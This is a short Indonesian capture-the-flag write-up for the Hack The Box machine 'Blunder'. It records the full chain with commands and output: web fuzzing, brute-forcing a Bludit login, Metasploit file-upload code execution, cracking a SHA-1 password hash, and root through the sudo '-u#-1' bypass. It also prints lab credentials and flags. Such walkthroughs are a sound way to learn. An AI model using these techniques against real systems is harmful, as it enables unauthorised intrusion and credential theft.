- Nmap, dapet port 80 sama ssh
- enum, dapet /admin/, kita cari dlu credsnya karena kita bisa bruteforce (googling)
- enum lagi
```
wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --sc 200,202,204,301,302,307,403 -u 10.10.10.191/FUZZ
```
```
wuvel@wuvel:~$ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --sc 200,202,204,301,302,307,403 -u 10.10.10.191/FUZZ.txt

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ.txt
Total requests: 4655

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                
===================================================================

000000010:   403        9 L      28 W     277 Ch      ".hta"                                                                                                 
000000011:   403        9 L      28 W     277 Ch      ".htaccess"                                                                                            
000000012:   403        9 L      28 W     277 Ch      ".htpasswd"                                                                                            
000003516:   200        1 L      4 W      22 Ch       "robots"                                                                                               
000004122:   200        4 L      23 W     118 Ch      "todo"
```

```
todo.txt

-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
Usernamenya berarti fergus
```

```
generate worlist dari webnya 

cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191/
```

```
Bruteforce login pake script https://rastating.github.io/bludit-brute-force-mitigation-bypass/

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
()
```

```
Pake msfconsole, search bludit, pake upload image exec, gas

meterpreter > shell
python -c "import pty;pty.spawn('/bin/bash')"

www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}

```

```
wuvel@wuvel:~/Wuvel/CTF/HTB/Blunder$ hashid faca404fd5c0a31cf1897b823c695c85cffeb98d

Analyzing 'faca404fd5c0a31cf1897b823c695c85cffeb98d'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160)
```

```
Decrypt SHA-1 -> faca404fd5c0a31cf1897b823c695c85cffeb98d   sha1    Password120
```

```
ww-data@blunder:/home$ su hugo
su hugo
Password: Password120

hugo@blunder:/home$
hugo@blunder:~$ cat user.txt
cat user.txt
20518b6d61138988c64d52372d4dde6d
```

```
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash

Exploit -> https://www.exploit-db.com/exploits/47502
```

```
hugo@blunder:~$ sudo -u#-1 bash

root@blunder:/home/hugo# cd /root
cd /root
root@blunder:/root# ls
ls
root.txt
root@blunder:/root# cat root.txt
cat root.txt
3d724d228f19c9d35bc6cf0308cc76e8
```